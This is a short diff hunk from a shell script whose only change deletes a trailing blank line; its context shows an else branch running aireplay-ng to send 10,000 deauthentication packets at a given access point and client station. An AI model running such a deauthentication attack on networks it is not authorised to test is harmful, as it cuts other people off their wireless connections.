@@ -42,4 +42,3 @@ if [ "$EXIT" = "1" ]; then
 else
     aireplay-ng --deauth 10000 -a "$BSSID" -c "$STATION" "$INTERFACE"
 fi
-
